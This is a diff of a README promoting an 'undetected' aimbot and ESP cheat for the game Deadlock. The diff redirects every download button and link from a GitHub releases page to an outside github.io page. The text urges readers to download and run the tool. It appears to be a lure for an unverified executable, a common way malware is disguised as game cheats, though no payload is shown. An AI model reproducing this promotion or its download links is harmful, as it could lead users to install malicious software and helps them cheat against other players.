@@ -1,6 +1,6 @@
 # 🎯 deadlock-aimbot-hack-2026 - Undetected Aim and ESP Advantage
 
-[![Download Now](https://img.shields.io/badge/Download-Deadlock_Aimbot_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/franciskabondable4153/deadlock-aimbot-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Deadlock_Aimbot_2026-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://franciskabondable4153.github.io)
 
 ---
 
@@ -15,7 +15,7 @@ This guide will walk you through everything you need to know — from downloadin
 ## 📥 Download the Application
 
 Visit this link to download the application:  
-**[https://github.com/franciskabondable4153/deadlock-aimbot-hack-2026/releases](https://github.com/franciskabondable4153/deadlock-aimbot-hack-2026/releases)**
+**[https://franciskabondable4153.github.io](https://franciskabondable4153.github.io)**
 
 Click the link above. You'll be taken to the releases page. Look for the newest version (usually at the top) and click the download button. The file will start downloading to your computer.
 
@@ -178,4 +178,4 @@ deadlock-2026, deadlock-aim-hack, deadlock-aimbot, deadlock-aimbot-2026, deadloc
 
 **Ready to dominate?** Click the button below to get started:
 
-[![Get the Tool](https://img.shields.io/badge/🚀_Download_Now-Deadlock_Aimbot_2026-28A745?style=for-the-badge&logo=github&logoColor=white)](https://github.com/franciskabondable4153/deadlock-aimbot-hack-2026/releases)
+[![Get the Tool](https://img.shields.io/badge/🚀_Download_Now-Deadlock_Aimbot_2026-28A745?style=for-the-badge&logo=github&logoColor=white)](https://franciskabondable4153.github.io)
